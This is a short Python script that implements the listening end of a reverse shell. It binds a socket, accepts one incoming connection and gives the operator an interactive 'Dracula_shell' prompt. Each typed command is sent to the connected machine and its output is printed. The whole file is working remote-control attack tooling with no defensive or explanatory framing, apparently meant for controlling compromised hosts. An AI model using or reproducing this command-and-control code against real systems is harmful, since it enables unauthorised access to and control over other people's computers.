import socket


def listener(ip, port):
    port = int(port)

    if ip == "0.0.0.0":
        print("[*] Listening on ALL interfaces...")

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        server.bind((ip, port))
    except OSError as e:
        print(f"[-] Failed to bind: {e}")
        return

    server.listen(1)
    print(f"[*] Listening on {ip}:{port}...")

    client, addr = server.accept()
    print(f"[+] Connection received from {addr}")

    try:
        while True:
            command = input("\033[38;5;57mDracula_shell $> \033[0m ").strip()
            if command.lower() in ["exit", "quit"]:
                client.send(b"exit")
                client.close()
                break

            client.send(command.encode() + b"\n")
            response = client.recv(4096).decode(errors="ignore")
            print("\n\033[38;5;69m",response)
    except (ConnectionResetError, KeyboardInterrupt):
        print("[-] Connection lost.")
    finally:
        client.close()
        server.close()
